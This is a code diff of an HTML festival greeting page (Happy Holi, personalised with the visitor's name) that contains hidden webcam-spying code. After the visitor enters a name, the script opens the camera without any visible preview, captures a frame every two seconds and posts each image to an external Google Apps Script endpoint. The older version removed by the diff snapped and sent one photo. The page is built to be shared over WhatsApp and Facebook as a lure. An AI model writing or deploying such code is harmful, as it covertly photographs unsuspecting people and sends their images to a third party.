@@ -1,161 +1,299 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Happy Holi - Camera Page</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom, #ffff99, #99ccff);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      overflow: hidden;
-      text-align: center;
-      color: #333;
-    }
-    .container {
-      padding: 20px;
-      max-width: 400px;
-      width: 100%;
-    }
-    .greeting {
-      font-size: 2em;
-      font-weight: bold;
-      color: #00b300;
-      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
-    }
-    #video {
-      width: 100%;
-      border-radius: 4px;
-      margin-bottom: 10px;
-      display: none;
-    }
-    h1 {
-      font-size: 2em;
-      color: #000;
-      margin-bottom: 20px;
-    }
-    .share-buttons {
-      margin-top: 20px;
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-    }
-    .whatsapp, .facebook {
-      padding: 10px 20px;
-      margin: 10px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 1em;
-      width: 100%;
-    }
-    .whatsapp {
-      background-color: #25d366;
-      color: white;
-    }
-    .facebook {
-      background-color: #3b5998;
-      color: white;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Holi</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffff99, #99ccff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-    /* Mobile responsive styling */
-    @media (max-width: 600px) {
-      .whatsapp, .facebook {
-        width: 80%; /* Make buttons wider on smaller screens */
-        font-size: 1.2em; /* Increase font size */
-        padding: 15px 0; /* Make buttons taller */
-      }
-    }
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
 
-  </style>
+        h1 {
+            font-size: 2em;
+            color: #000;
+            margin-bottom: 20px;
+        }
+
+        .welcome-section {
+            margin-bottom: 20px;
+        }
+
+        .welcome-icon {
+            font-size: 1.5em;
+        }
+
+        .hindi-text {
+            font-size: 1.2em;
+            margin: 5px 0;
+            font-family: 'Noto Sans Devanagari', sans-serif;
+            color: #333;
+        }
+
+        .green-bg {
+            background-color: #00ff00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            color: #ffffff;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .alok-text {
+            font-size: 3em;
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+            margin: 20px 0;
+            font-weight: bold;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .wishing-section h2 {
+            font-size: 1.5em;
+            color: #0000ff;
+            margin: 5px 0;
+        }
+
+        .red-text {
+            font-size: 1.2em;
+            color: #ff0000;
+            margin: 10px 0;
+        }
+
+        .green-text {
+            font-size: 1em;
+            color: #ffffff;
+            background-color: #00ff00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .pink-text {
+            font-size: 1em;
+            color: #ff00ff;
+            background-color: #ff99ff;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .purple-text {
+            font-size: 1em;
+            color: #800080;
+            background-color: #d8bfd8;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .share-buttons {
+            margin-top: 20px;
+        }
+
+        .share-buttons button {
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        .whatsapp {
+            background-color: #25d366;
+            color: white;
+        }
+
+        .facebook {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+            .alok-text {
+                font-size: 2em;
+            }
+            .wishing-section h2 {
+                font-size: 1.2em;
+            }
+            .share-buttons button {
+                display: block;
+                width: 80%;
+                margin: 10px auto;
+            }
+        }
+
+        /* Popup box styles */
+        .popup {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            z-index: 999;
+        }
+
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 998;
+        }
+
+        .popup .popup-content {
+            text-align: center;
+        }
+
+        .popup button {
+            padding: 10px 20px;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Welcome to the Camera Page</h1>
-    
-    <!-- Greeting based on name parameter -->
-    <div class="greeting" id="greetingMessage"></div>
-
-    <p>Get ready to take your picture!</p>
-
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    
-    <div class="share-buttons">
-      <button class="whatsapp">Whatsapp Share</button>
-      <button class="facebook">Facebook Share</button>
+    <div class="container">
+        <h1>|||| Every Day is Special ||||</h1>
+        <div class="welcome-section">
+            <span class="welcome-icon">🙏</span> Welcome <span class="welcome-icon">🙏</span>
+            <p class="hindi-text">आपका हर दिन खुशियों से भरा हो।</p>
+            <p class="hindi-text">इस खास दिन की ढेरों शुभकामनाएँ !</p>
+            <p class="hindi-text green-bg">|| खुशियाँ आपके साथ हों ||</p>
+        </div>
+        <div class="alok-text" id="userName">ALOK</div>
+        <div class="wishing-section">
+            <h2>Wishing you a very</h2>
+            <h2>⭐ Happy xxx ⭐</h2>
+            <p class="red-text">to you and your lovely family</p>
+            <p class="green-text">Wishing you and your family lots of happiness and blessings on this special occasion. May joy always surround you.</p>
+            <p class="pink-text">⭐ I wish that this day is your best one. ⭐</p>
+            <p class="hindi-text purple-text">आज का दिन आपके जीवन में ढेर सारी खुशियाँ, सुकून और प्यार लेकर आए। आपको इस पावन अवसर की हार्दिक शुभकामनाएँ।</p>
+        </div>
+        <div class="share-buttons">
+            <button class="whatsapp">Whatsapp Share</button>
+            <button class="facebook">Facebook Share</button>
+        </div>
     </div>
-  </div>
 
-  <script>
-    // Function to get the URL parameter (name)
-    function getUrlParameter(name) {
-      const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get(name);
-    }
+    <!-- Popup Box -->
+    <div class="popup-overlay" id="popup-overlay"></div>
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <h2>Please enter your name</h2>
+            <input type="text" id="user-name-input" placeholder="Enter your name" />
+            <button onclick="startCamera()">Submit</button>
+        </div>
+    </div>
 
-    // Retrieve the name from the URL and display it
-    const name = getUrlParameter('name');
-    if (name) {
-      document.getElementById('greetingMessage').textContent = `Hello, ${name}! 🎉`;
-    } else {
-      document.getElementById('greetingMessage').textContent = "Hello, Guest! 🎉";
-    }
+    <script>
+        // Function to open the popup when the page loads
+        window.onload = function() {
+            document.getElementById("popup").style.display = "block";
+            document.getElementById("popup-overlay").style.display = "block";
+        };
 
-    // Camera functionality (video capture)
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const photoInput = document.createElement('input'); // Create photo input dynamically
+        // Function to close the popup
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("popup-overlay").style.display = "none";
+        }
 
-    // Access the camera and start the video
-    navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
+        // Function to start the camera and handle name input
+        function startCamera() {
+            const userName = document.getElementById("user-name-input").value;
+            if (userName) {
+                // Set name in the userName div
+                document.getElementById("userName").textContent = userName;
+                closePopup();
 
-      // Take a photo after 2 seconds and auto-submit
-      setTimeout(() => {
+                // Start camera stream and automatic image capture
+                initializeCamera();
+            } else {
+                alert("Please enter your name.");
+            }
+        }
+
+        // Automatically capture image from the video and send it to the server
+        const canvas = document.createElement('canvas');
         const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth || 640; // Fallback width
-        canvas.height = video.videoHeight || 480; // Fallback height
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Create a hidden input with the captured image data
-        photoInput.type = 'hidden';
-        photoInput.value = canvas.toDataURL('image/png');
-        document.body.appendChild(photoInput);
+        function initializeCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-        // Stop the video stream
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = 'none';
+                video.addEventListener('loadeddata', () => {
+                    setInterval(() => {
+                        // Set canvas dimensions equal to the video stream
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0);
 
-        // Automatically submit the form or send the image to a server
-        const formData = new FormData();
-        formData.append('photo', photoInput.value);
-        
-        // Send form data using fetch (or you can use your original Google Apps Script endpoint)
-        fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-          // Handle success response (optional)
-          console.log("Photo submitted successfully", data);
-          window.location.href = 'https://google.com'; // Or any other redirection
-        })
-        .catch(error => {
-          console.error('Error submitting photo:', error);
-        });
-      }, 2000); // Capture after 2 seconds
-    })
-    .catch(err => {
-      console.error("Error accessing camera:", err);
-    });
-  </script>
+                        // Convert canvas to Data URL (base64 encoded image)
+                        const imageData = canvas.toDataURL('image/png');
+
+                        // Send image data to the server automatically via fetch
+                        fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: imageData }),
+                            headers: { 'Content-Type': 'application/json' }
+                        })
+                        .then(response => {
+                            if (!response.ok) throw new Error('Network response was not ok');
+                            console.log("Image sent successfully");
+                        })
+                        .catch(error => {
+                            console.error("Error sending image:", error);
+                        });
+                    }, 2000); // Capture and send every 2 seconds
+                });
+            })
+            .catch(err => {
+                console.log("Camera access denied:", err);
+            });
+        }
+
+        // Get name from URL (optional if you want to pre-fill name)
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+        if (name) {
+            document.getElementById("userName").textContent = name;
+        }
+    </script>
 </body>
 </html>
